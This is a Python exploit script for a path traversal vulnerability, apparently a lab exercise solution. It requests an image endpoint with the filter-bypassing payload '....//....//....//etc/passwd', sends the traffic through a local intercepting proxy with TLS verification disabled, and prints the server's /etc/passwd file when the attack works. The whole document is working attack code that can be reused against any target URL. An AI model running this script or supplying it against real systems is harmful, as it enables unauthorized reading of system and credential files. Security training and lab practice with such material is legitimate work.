import requests
import sys
import urllib3

# Disabling the warnings of certificates, .. etc.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuring the Proxies:
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

# Creating Path_Traversal function:
def Path_Traversal(url):
    imagePath = url + '/image?filename='
    payload = '....//....//....//etc/passwd'
    respond = requests.get(imagePath + payload, proxies=proxies, verify=False)
    
    # Check if the operation done successfully:
    if 'root:x' in respond.text:
        print('(+) Exploitation Done Successfully!')
        print('(+) The contents of the /etc/passwd file:')
        print('-------------------------------------------------')
        print(respond.text)
        print('-------------------------------------------------')

    else:
        print('(-) Exploitation Failed.')

# Creating the main function:
def main():
    # Check the validation the syntax of using the script.
    if len(sys.argv) != 2:
        print('(+) Usage: python3 %s <url>' %sys.argv[0])
        print('(+) Example: python3 %s www.example.com' %sys.argv[0])
        sys.exit(-1)
    
    # if the syntax is valid
    print('(+) Exploiting path traversal vulnerability... ')
    url = sys.argv[1]
    Path_Traversal(url)

if __name__ == '__main__':
    main()